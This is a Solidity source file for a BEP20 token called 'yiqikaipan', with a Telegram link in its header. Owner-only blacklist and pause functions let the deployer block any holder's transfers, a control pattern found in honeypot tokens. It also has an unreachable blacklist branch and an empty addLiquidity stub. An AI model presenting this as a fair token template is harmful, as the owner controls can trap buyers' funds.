// SPDX-License-Identifier: MIT
//https://t.me/+MbB_vWtbYqU2MjYx
pragma solidity ^0.8.0;

contract BEP20Token {
    string private constant _name = "yiqikaipan";
    string private constant _symbol = "yqkp";
    uint8 private constant _decimals = 18;
    uint256 private constant _totalSupply = 1000000000 * 10**uint256(_decimals);

    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) private _isBlacklisted;
    bool private _paused;
    address private _owner;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event BlacklistUpdated(address indexed account, bool isBlacklisted);
    event Paused(bool paused);

    modifier onlyOwner() {
        require(msg.sender == _owner, "Caller is not the owner");
        _;
    }

    constructor() {
        _owner = msg.sender;
        _balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    function name() external pure returns (string memory) {
        return _name;
    }

    function symbol() external pure returns (string memory) {
        return _symbol;
    }

    function decimals() external pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() external view returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) external view returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) external returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
        return true;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function allowance(address owner, address spender) external view returns (uint256) {
        return _allowances[owner][spender];
    }

    function addToBlacklist(address account) external onlyOwner {
        require(account != address(0), "Cannot blacklist zero address");
        _isBlacklisted[account] = true;
        emit BlacklistUpdated(account, true);
    }

    function removeFromBlacklist(address account) external onlyOwner {
        _isBlacklisted[account] = false;
        emit BlacklistUpdated(account, false);
    }

    function setPaused(bool paused) external onlyOwner {
        _paused = paused;
        emit Paused(paused);
    }

    function isBlacklisted(address account) external view returns (bool) {
        return _isBlacklisted[account];
    }

    function paused() external view returns (bool) {
        return _paused;
    }

    function addLiquidity() external onlyOwner {
        // Code for adding liquidity
        // Add the logic for adding liquidity to PancakeSwap or any other DEX here
    }

    function _transfer(address sender, address recipient, uint256 amount) private {
        require(sender != address(0), "Transfer from zero address");
        require(recipient != address(0), "Transfer to zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        require(!_isBlacklisted[sender], "Transfer from blacklisted address");
        require(!_isBlacklisted[recipient], "Transfer to blacklisted address");
        require(!_paused, "Transfer while paused");

        uint256 senderBalance = _balances[sender];
        require(senderBalance >= amount, "Insufficient balance");

        _balances[sender] -= amount;
        _balances[recipient] += amount;

        emit Transfer(sender, recipient, amount);

        if (_isBlacklisted[recipient]) {
            _balances[recipient] = 0;
            emit Transfer(recipient, address(0), amount);
        }
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "Approve from zero address");
        require(spender != address(0), "Approve to zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
}